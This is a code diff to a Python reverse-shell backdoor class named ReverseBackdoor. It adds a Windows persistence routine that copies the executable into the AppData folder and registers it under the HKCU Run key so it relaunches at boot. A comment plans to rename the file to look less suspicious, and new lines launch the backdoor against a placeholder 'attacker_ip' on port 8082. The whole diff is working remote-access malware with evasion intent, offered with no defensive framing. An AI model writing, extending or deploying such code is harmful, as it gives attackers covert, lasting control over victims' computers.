@@ -5,6 +5,7 @@ import json
 import sys
 import os
 import base64
+import shutil
 
 class ReverseBackdoor:
 	'''
@@ -14,13 +15,29 @@ class ReverseBackdoor:
 	params: ip(str), port(int)
 	'''
 	def __init__(self, ip:str, port:int)->None:
+		self.create_persistence()
+		
 		self.port = port 
 		self.ip = ip
-
+		
 		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connect_to_listener()
 	
+
+	def create_persistence(self):
+		'''
+		tries to connect to user when machine restarts.
+		'''
+		if os.name == 'nt':
+			# print('inside persistence if.')
+			# TODO: Change MyBackdoor to something less suspectful before creating exe
+			backdoor_file_path = os.environ['appdata'] + '\\MyBackdoor.exe'
+			if not os.path.exists(backdoor_file_path):
+				# print('inside if if.')
+				shutil.copy(sys.executable, backdoor_file_path)
+				subprocess.call(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MyBackdoor /t REG_SZ /d "{backdoor_file_path}"')
+
 
 	def connect_to_listener(self):
 		'''
@@ -153,3 +170,10 @@ class ReverseBackdoor:
 			except Exception as e:
 				exception = ('[-] Exception : ' + str(e))
 				self.serial_send(exception)
+
+
+try :
+    backdoor = ReverseBackdoor(ip='attacker_ip', port=8082)
+    backdoor.run()
+except Exception as e:
+    print('Exception :',e)
